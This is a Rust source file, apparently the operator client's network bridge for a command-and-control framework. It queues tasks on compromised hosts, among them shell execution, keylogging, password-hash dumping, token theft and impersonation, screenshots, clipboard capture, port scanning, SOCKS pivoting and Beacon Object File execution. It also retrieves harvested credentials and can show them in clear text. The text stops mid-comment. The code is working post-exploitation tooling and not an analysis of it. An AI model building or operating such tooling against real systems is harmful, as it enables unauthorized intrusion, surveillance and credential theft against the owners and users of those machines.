//! Data bridge: the ONLY place that touches the network or blocks.
//!
//! Architecture (validated against Makepad 2.0's `automate` example):
//!
//! ```text
//!   UI thread (Makepad main)            IO worker (std::thread + tokio)
//!   ┌──────────────────────┐            ┌───────────────────────────┐
//!   │ App                  │            │ reqwest async client      │
//!   │  state_updates:      │  Snapshot  │  - GET /api/sessions 2s  │
//!   │    ToUIReceiver <────├────────────┤  - per-task result poll   │
//!   │  ui_controls:        │  Cmd       │    (exponential backoff)  │
//!   │    FromUISender ────>├────────────>│ send() = set_ui_signal() │
//!   └──────────────────────┘            └───────────────────────────┘
//! ```
//!
//! `ToUISender::send()` calls `SignalToUI::set_ui_signal()`, which wakes the
//! Makepad event loop; `App::handle_signal` (via `MatchEvent`) drains the
//! channel and refreshes. The UI thread NEVER blocks on IO — it only ever
//! copies cheap `Vec`s out of the channel. This is what makes the client
//! "fast + low-resource": the GPU renders at the monitor's native rate, IO is
//! off-thread, and the UI redraws only when a snapshot changes.

use std::time::{Duration, Instant};

use makepad_widgets::log;
// `ToUIReceiver`/`FromUISender` come from makepad-network, which platform
// re-exports as `makepad_platform::makepad_network` (platform/src/lib.rs:90).
// widgets → draw → platform, so we reach it via makepad_widgets.
use makepad_widgets::makepad_platform::makepad_network::ui_signal::{
    FromUIReceiver, FromUISender, ToUIReceiver, ToUISender,
};
use serde::Deserialize;

// ---- wire types (mirror the REST API; same shapes as the egui client) ----

// SessionView + the authed/session_signature helpers are shared (see
// crates/rest) so client-ui can't drift from the server's real output — the
// prior local copy silently dropped age_secs/ja3/ja4. SessionView is re-exported
// (pub) so `crate::bridge::SessionView` still resolves for Snapshot/main.rs.
pub use nyx_rest::SessionView;
use nyx_rest::{authed, session_signature};

/// A full UI snapshot pushed worker→UI. Coarse-grained on purpose: the worker
/// owns the polling cadence and only sends when something changed, so the UI
/// redraws at most once per poll interval (default 2s), not per byte of shell
/// output.
#[derive(Debug, Clone, Default)]
pub struct Snapshot {
    /// Most recent session list (empty until the first successful fetch).
    pub sessions: Vec<SessionView>,
    /// Log lines accumulated since the last snapshot. The UI appends these to
    /// its event log; the worker trims its own buffer so this channel can't
    /// grow unbounded (H2-style memory-DoS guard).
    pub log_lines: Vec<String>,
    /// Connection state — drives the top status bar.
    pub connected: bool,
    /// True while a `Cmd::Connect` attempt is in flight (between the Connect
    /// command and the first `fetch_sessions` resolution). Drives the connect
    /// overlay: shown while true, fades out when it flips false.
    pub connecting: bool,
    /// The real connection stage currently in flight (or the last one reached).
    /// Drives the step-tip line under the progress bar.
    pub connect_stage: ConnectStage,
    /// BOF execution updates since the last snapshot. Each entry is appended to
    /// the BOF history UI global by the App. Empty unless a BOF task changed
    /// state (enqueued / completed / errored).
    pub bof_updates: Vec<BofUpdate>,
    /// Per-session shell output lines: (session_id, line). Drained into
    /// `CONSOLE` in `apply_snapshot` so the per-beacon console widget can
    /// render them without touching the global event log.
    pub console_lines: Vec<(String, String)>,
}

/// One BOF lifecycle event, pushed worker→UI and routed into the BOFS global.
#[derive(Debug, Clone)]
pub struct BofUpdate {
    pub name: String,
    pub args: String,
    pub status: BofState,
}

/// Lifecycle of a BOF task. Mirrors the widget's display status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BofState {
    Pending,
    Done,
    Error,
}

/// A real, observable stage of an in-flight connect attempt. Drives the
/// step-tip line under the connect overlay (see the overlay design spec).
/// `Resolving` is set when `Cmd::Connect` arrives; `Connecting` while the
/// request round-trip is in flight; `Done`/`Failed` from the fetch_sessions
/// Ok/Err branches. (`Authenticating` is reserved for a future fetch_sessions
/// split per spec §4.5 — reqwest bundles send+decode into one future.) reqwest's
/// `GaiResolver` isn't publicly constructable, so DNS/TCP aren't isolated as
/// separate stages without a resolver hook — they surface together as
/// `Connecting`, which is the honest description.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ConnectStage {
    #[default]
    Idle,
    Resolving,
    Connecting,
    Authenticating,
    Done,
    Failed,
}

/// UI→worker command. Enum keeps the channel message type closed and explicit.
#[derive(Debug, Clone)]
pub enum Cmd {
    /// Target team server base URL + optional API bearer token.
    /// `password` is the operator-typed token sent as `Authorization: Bearer`.
    /// `None` when the server has no `NYX_TOKEN` configured (local dev).
    Connect { server: String, password: Option<String> },
    /// Enqueue a shell task on the given session.
    Shell { session: String, args: String },
    /// Enqueue a shell task but parse the result for FileTree.
    Ls { session: String, args: String },
    /// Enqueue a shell task but parse the result for ProcTable.
    Ps { session: String, args: String },
    /// Basic tasks
    Ping { session: String },
    Sleep { session: String, seconds: u32, jitter_pct: u8 },
    Exit { session: String },
    /// File operations
    Upload { session: String, name: String, data_hex: String },
    Download { session: String, path: String },
    FileOp { session: String, op: String, path: String, dest: Option<String> },
    Driveinfo { session: String },
    /// Network & Pivoting
    ConnectChan { session: String, host: String, port: u16 },
    Socks { session: String, chan: u32, op: u8, addr: String, port: u16 },
    Portscan { session: String, host: String, ports: String },
    Net { session: String, query: String },
    /// Information & Media
    Screenshot { session: String, monitor: u8 },
    Screenwatch { session: String, interval_secs: u32 },
    Clipboard { session: String },
    Env { session: String, name: String },
    Keylog { session: String, action: u8 },
    Hashdump { session: String, method: u8 },
    /// Token operations (lateral movement). steal/make a token, revert
    /// impersonation, query the current thread identity.
    StealToken { session: String, pid: u32 },
    MakeToken {
        session: String,
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    Rev2Self { session: String },
    GetUid { session: String },
    /// Pull server-side creds (`GET /api/creds`) and print them to the log.
    FetchCreds { reveal: bool },
    /// Query the server audit log (`GET /api/audit`) and print to the log.
    FetchAudit { operator: Option<String>, action: Option<String>, limit: Option<u32> },
    /// Enqueue a BOF (Beacon Object File) task on the given session. `name` is
    /// the COFF entry label shown in the BOF history; `args` the space-separated
    /// arg string (split here to match the server's `Vec<String>`); `data_hex`
    /// the hex-encoded COFF bytes. The result (`kind == "bof"`) is routed into
    /// the BOFS UI global.
    Bof { session: String, name: String, args: String, data_hex: String },
    /// Stop the worker loop (app shutdown).
    Shutdown,
}

/// Default poll interval for the session list. Short enough to feel live,
/// long enough to not hammer the team server. Tunable later via profile.
const SESSION_POLL: Duration = Duration::from_secs(2);

/// Bound on the worker's pending log buffer — if the UI hasn't drained this
/// many lines we drop oldest. Prevents a slow UI from OOMing the worker if
/// the server floods events (mirrors the server's own H2 memory-DoS bound).
const LOG_BUFFER_CAP: usize = 1024;

/// Channels the `App` holds. Returned by [`spawn`].
pub struct Bridge {
    /// Worker→UI snapshots. Drain in `handle_signal`.
    pub to_ui: ToUIReceiver<Snapshot>,
    /// UI→worker commands. Send on button clicks.
    pub from_ui: FromUISender<Cmd>,
}

/// Spin up the IO worker and return the channel ends the App holds.
///
/// The worker owns its own tokio runtime so the rest of the crate stays
/// sync-friendly (Makepad's event loop is sync). One thread, one runtime —
/// `current_thread` keeps it to a single OS thread: minimal footprint, fits
/// "low-resource". No thread-pool proliferation.
pub fn spawn() -> Bridge {
    let to_ui: ToUIReceiver<Snapshot> = ToUIReceiver::default();
    let sender = to_ui.sender();
    let mut from_ui: FromUISender<Cmd> = FromUISender::default();
    // receiver() consumes &mut self and can only be called once — do it here,
    // before handing the sender end to the App.
    let cmd_rx = from_ui.receiver();

    std::thread::spawn(move || {
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(e) => {
                log!("nyx bridge: tokio runtime build failed: {e}");
                return;
            }
        };
        rt.block_on(worker_loop(cmd_rx, sender));
    });

    Bridge { to_ui, from_ui }
}

// ---- worker loop -----------------------------------------------------------

/// What kind of task a pending entry is, so its result can be routed to the
/// right UI surface (shell output → event log; BOF output → BOF history).
#[derive(Clone)]
enum TaskKind {
    /// A generic task whose result is just text to print to the console.
    /// The string is the command name shown in the log (e.g. "shell", "ping").
    Generic(String),
    Ls,
    Ps,
    Hashdump,
    /// BOF, carrying its display name + args for the history row.
    Bof { name: String, args: String },
}

/// A task whose result the worker is still polling.
struct PendingTask {
    session: String,
    task_id: u64,
    kind: TaskKind,
    backoff: Duration,
    last_poll: Instant,
}

async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
    // (server_url, optional bearer token). None until first Connect.
    let mut server: Option<(String, Option<String>)> = None;
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .expect("reqwest client build");

    // Pending tasks whose result we're still polling. Each gets an exponential
    // backoff so a slow task doesn't spin.
    let mut pending: Vec<PendingTask> = Vec::new();
    let mut log_buf: Vec<String> = Vec::new();
    let mut bof_updates: Vec<BofUpdate> = Vec::new();
    let mut console_lines: Vec<(String, String)> = Vec::new();
    let mut last_session_sig = String::new();
    // Tracks the connection state last REPORTED to the UI. A connect→disconnect
    // (or vice-versa) transition must always push a snapshot even if nothing
    // else changed — otherwise the UI never learns it connected (e.g. fetching
    // an empty session list on first connect yields no signature change, so the
    // old `changed || log_buf || bof` guard silently swallowed the only
    // `connected=true` the UI ever needed).
    let mut was_connected = false;
    // Connect-overlay state. `connecting` is true while a Cmd::Connect attempt
    // is in flight; `connect_stage` drives the step-tip. The 20s timeout guard
    // uses `connect_attempt_time` so a wedged attempt (dropped packets, no
    // RST) can't leave the overlay open forever.
    let mut connecting = false;
    let mut connect_stage = ConnectStage::Idle;
    let mut connect_attempt_time: Option<Instant> = None;

    loop {
        // 0. 20s timeout: if a connect attempt never resolves (dropped
        // packets, no RST), give up so the overlay can't get stuck open.
        if connecting {
            if let Some(t0) = connect_attempt_time {
                if t0.elapsed() > Duration::from_secs(20) {
                    connecting = false;
                    connect_stage = ConnectStage::Failed;
                    connect_attempt_time = None;
                    log_push(&mut log_buf, "! connect: timed out");
                    let _ = to_ui.send(take_snapshot(
                        &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
                        connecting, connect_stage,
                    ));
                }
            }
        }

        // 1. Drain any UI→worker commands (non-blocking).
        while let Ok(cmd) = cmd_rx.try_recv() {
            match cmd {
                Cmd::Shutdown => return,
                Cmd::Connect { server: s, password } => {
                    log_push(&mut log_buf, &format!("connecting to {s} …"));
                    server = Some((s, password));
                    connecting = true;
                    connect_stage = ConnectStage::Resolving;
                    connect_attempt_time = Some(Instant::now());
                    let _ = to_ui.send(take_snapshot(
                        &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
                        connecting, connect_stage,
                    ));
                }
                Cmd::Shell { session, args } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] $ {} → task {}", short(&session), args, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("shell".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! shell: {e}")),
                    }
                }
                Cmd::Ls { session, args } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] ls → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Ls, backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! ls: {e}")),
                    }
                }
                Cmd::Ps { session, args } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    let cmd_json = serde_json::json!({ "type": "shell", "args": args });
                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] ps → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Ps, backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! ps: {e}")),
                    }
                }
                Cmd::Ping { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "ping" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] ping → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("ping".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! ping: {e}")),
                    }
                }
                Cmd::Sleep { session, seconds, jitter_pct } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] sleep {} {}% → task {}", short(&session), seconds, jitter_pct, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("sleep".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! sleep: {e}")),
                    }
                }
                Cmd::Exit { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "exit" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] exit → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("exit".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! exit: {e}")),
                    }
                }
                Cmd::Upload { session, name, data_hex } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "upload", "name": name, "data_hex": data_hex }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] upload {} → task {}", short(&session), name, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("upload".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! upload: {e}")),
                    }
                }
                Cmd::Download { session, path } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "download", "path": path }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] download {} → task {}", short(&session), path, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("download".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! download: {e}")),
                    }
                }
                Cmd::FileOp { session, op, path, dest } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "fileop", "op": op, "path": path, "dest": dest }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] {} {} → task {}", short(&session), op, path, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic(op.clone()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! fileop: {e}")),
                    }
                }
                Cmd::Driveinfo { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "driveinfo" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] driveinfo → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("driveinfo".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! driveinfo: {e}")),
                    }
                }
                Cmd::ConnectChan { session, host, port } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "connect", "host": host, "port": port }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] connect {}:{} → task {}", short(&session), host, port, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("connect".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! connect: {e}")),
                    }
                }
                Cmd::Socks { session, chan, op, addr, port } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] socks op {} → task {}", short(&session), op, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("socks".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! socks: {e}")),
                    }
                }
                Cmd::Portscan { session, host, ports } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "portscan", "host": host, "ports": ports }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] portscan {} {} → task {}", short(&session), host, ports, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("portscan".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! portscan: {e}")),
                    }
                }
                Cmd::Net { session, query } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "net", "query": query }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] net {} → task {}", short(&session), query, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("net".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! net: {e}")),
                    }
                }
                Cmd::Screenshot { session, monitor } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "screenshot", "monitor": monitor }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] screenshot {} → task {}", short(&session), monitor, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("screenshot".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! screenshot: {e}")),
                    }
                }
                Cmd::Screenwatch { session, interval_secs } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] screenwatch {}s → task {}", short(&session), interval_secs, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("screenwatch".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! screenwatch: {e}")),
                    }
                }
                Cmd::Clipboard { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "clipboard" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] clipboard → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("clipboard".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! clipboard: {e}")),
                    }
                }
                Cmd::Env { session, name } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "env", "name": name }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] env {} → task {}", short(&session), name, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("env".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! env: {e}")),
                    }
                }
                Cmd::Keylog { session, action } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "keylog", "action": action }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] keylog {} → task {}", short(&session), action, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("keylog".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! keylog: {e}")),
                    }
                }
                Cmd::Hashdump { session, method } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "hashdump", "method": method }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] hashdump {} → task {}", short(&session), method, tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Hashdump, backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}")),
                    }
                }
                Cmd::StealToken { session, pid } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "stealtoken", "pid": pid }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] steal_token({pid}) → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("stealtoken".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! steal_token: {e}")),
                    }
                }
                Cmd::MakeToken { session, domain, user, password, logon_type } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] make_token({domain}\\{user}) → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("maketoken".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! make_token: {e}")),
                    }
                }
                Cmd::Rev2Self { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "rev2self" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] rev2self → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("rev2self".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}")),
                    }
                }
                Cmd::GetUid { session } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "getuid" }), token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] getuid → task {}", short(&session), tid));
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("getuid".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}")),
                    }
                }
                Cmd::FetchCreds { reveal } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    let url = if reveal { format!("{srv}/api/creds?reveal=1") } else { format!("{srv}/api/creds") };
                    match authed(client.get(&url), token).send().await {
                        Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
                            Ok(rows) => {
                                log_push(&mut log_buf, &format!("server creds: {} record(s)", rows.len()));
                                for r in rows.iter().take(50) {
                                    let realm = r.get("realm").and_then(|v| v.as_str()).unwrap_or("");
                                    let user = r.get("user").and_then(|v| v.as_str()).unwrap_or("");
                                    let kind = r.get("kind").and_then(|v| v.as_str()).unwrap_or("?");
                                    let secret = r.get("secret").and_then(|v| v.as_str()).unwrap_or("");
                                    log_push(&mut log_buf, &format!("  {kind:8} {realm}\\{user}: {secret}"));
                                }
                                if rows.len() > 50 {
                                    log_push(&mut log_buf, &format!("  ... ({} more, use CLI /creds sync for full)", rows.len() - 50));
                                }
                            }
                            Err(e) => log_push(&mut log_buf, &format!("! creds parse: {e}")),
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! creds fetch: {e}")),
                    }
                }
                Cmd::FetchAudit { operator, action, limit } => {
                    let Some((ref srv, ref token)) = server else { continue; };
                    let mut qs: Vec<String> = Vec::new();
                    if let Some(op) = &operator { qs.push(format!("operator={op}")); }
                    if let Some(ac) = &action { qs.push(format!("action={ac}")); }
                    if let Some(l) = limit { qs.push(format!("limit={l}")); }
                    let url = if qs.is_empty() { format!("{srv}/api/audit") } else { format!("{srv}/api/audit?{}", qs.join("&")) };
                    match authed(client.get(&url), token).send().await {
                        Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
                            Ok(rows) => {
                                log_push(&mut log_buf, &format!("audit: {} record(s)", rows.len()));
                                for r in rows.iter().take(50) {
                                    let seq = r.get("seq").and_then(|v| v.as_u64()).unwrap_or(0);
                                    let op = r.get("operator").and_then(|v| v.as_str()).unwrap_or("?");
                                    let act = r.get("action").and_then(|v| v.as_str()).unwrap_or("?");
                                    let tgt = r.get("target").and_then(|v| v.as_str()).unwrap_or("");
                                    log_push(&mut log_buf, &format!("  #{seq} {op} {act} {tgt}"));
                                }
                            }
                            Err(e) => log_push(&mut log_buf, &format!("! audit parse: {e}")),
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}")),
                    }
                }
                Cmd::Bof { session, name, args, data_hex } => {
                    let Some((ref srv, ref token)) = server else {
                        log_push(&mut log_buf, "! not connected");
                        continue;
                    };
                    let args_vec: Vec<&str> = if args.trim().is_empty() { Vec::new() } else { args.split_whitespace().collect() };
                    let cmd_json = serde_json::json!({ "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex });
                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] bof {} → task {}", short(&session), name, tid));
                            bof_updates.push(BofUpdate {
                                name: name.clone(), args: args.clone(), status: BofState::Pending,
                            });
                            pending.push(PendingTask {
                                session, task_id: tid,
                                kind: TaskKind::Bof { name, args },
                                backoff: Duration::from_millis(500), last_poll: Instant::now(),
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! bof enqueue: {e}"));
                            bof_updates.push(BofUpdate { name, args, status: BofState::Error });
                        }
                    }
                }
            }
        }

        let Some((ref srv, ref token)) = server else {
            tokio::time::sleep(Duration::from_millis(200)).await;
            continue;
        };

        // 2. Refresh session list (throttled to SESSION_POLL).
        match fetch_sessions(&client, srv, token).await {
            Ok(list) => {
                let sig = session_signature(&list);
                let changed = sig != last_session_sig;
                // A successful fetch means we ARE connected. If that differs
                // from what we last told the UI, we must push a snapshot even
                // when nothing else changed — otherwise an empty initial
                // session list (sig "" == initial "") leaves the UI stuck on
                // "Disconnected" forever, because the `changed || log || bof`
                // guard below would all be false.
                let connected_changed = !was_connected;
                was_connected = true;
                // A successful fetch ends the connect attempt. While the request
                // was in flight the stage read Connecting (DNS+TCP+TLS+request
                // bundled by reqwest). reqwest's GaiResolver isn't publicly
                // constructable, so we can't isolate DNS/TCP as separate stages
                // without a DNS-resolver hook — see the design spec §4.5. On a
                // fast localhost link Resolving→Connecting→Done collapses to a
                // single frame, which reads honestly.
                if connecting {
                    connecting = false;
                    connect_stage = ConnectStage::Done;
                    connect_attempt_time = None;
                }
                if changed {
                    last_session_sig = sig;
                }
                if changed || connected_changed || !log_buf.is_empty() || !bof_updates.is_empty() || !console_lines.is_empty() {
                    let _ = to_ui.send(take_snapshot(
                        &mut log_buf, true, &list, &mut bof_updates, &mut console_lines,
                        connecting, connect_stage,
                    ));
                }
            }
            Err(e) => {
                // A failed fetch means we are NOT connected. Mirror the
                // connected_changed logic so a drop is always reported too.
                was_connected = false;
                if connecting {
                    connecting = false;
                    connect_stage = ConnectStage::Failed;
                    connect_attempt_time = None;
                }
                log_push(&mut log_buf, &format!("! sessions: {e}"));
                let _ = to_ui.send(take_snapshot(
                    &mut log_buf, false, &[], &mut bof_updates, &mut console_lines,
                    connecting, connect_stage,
                ));
            }
        }

        // 3. Poll pending task results (with per-task backoff).
        let mut still_pending = Vec::new();
        for t in pending.drain(..) {
            if t.last_poll.elapsed() < t.backoff {
                still_pending.push(t);
                continue;
            }
            let PendingTask { session, task_id, kind, backoff, .. } = t;
            match poll_result(&client, srv, &session, task_id, token).await {
                Ok(Some(out)) => match kind {
                    TaskKind::Generic(name) => {
                        if !out.is_empty() {
                            log_push(&mut log_buf, &format!("[{}] {}: {}", short(&session), name, out));
                            console_lines.push((session.clone(), out));
                        }
                    }
                    TaskKind::Ls => {
                        if !out.is_empty() {
                            let entries = crate::parse::parse_any_files(&out);
                            log_push(&mut log_buf, &format!("[{}] ls loaded {} items", short(&session), entries.len()));
                            if let Ok(mut files) = crate::widgets::file_tree::FILES.write() {
                                *files = entries;
                            }
                        }
                    }
                    TaskKind::Ps => {
                        if !out.is_empty() {
                            let entries = crate::parse::parse_any_procs(&out);
                            log_push(&mut log_buf, &format!("[{}] ps loaded {} items", short(&session), entries.len()));
                            if let Ok(mut procs) = crate::widgets::process_table::PROCS.write() {
                                *procs = entries;
                            }
                        }
                    }
                    TaskKind::Hashdump => {
                        if !out.is_empty() {
                            let mut entries = crate::parse::parse_creds(&out);
                            // add session source info to each entry
                            for e in &mut entries {
                                if e.source == "localhost" {
                                    e.source = session.clone();
                                }
                            }
                            // Namespace placeholder / no-domain creds by session so the
                            // same principal harvested from two different hosts doesn't
                            // collide on ("", principal) and silently overwrite the
                            // earlier session's record. (parse_creds emits source=""
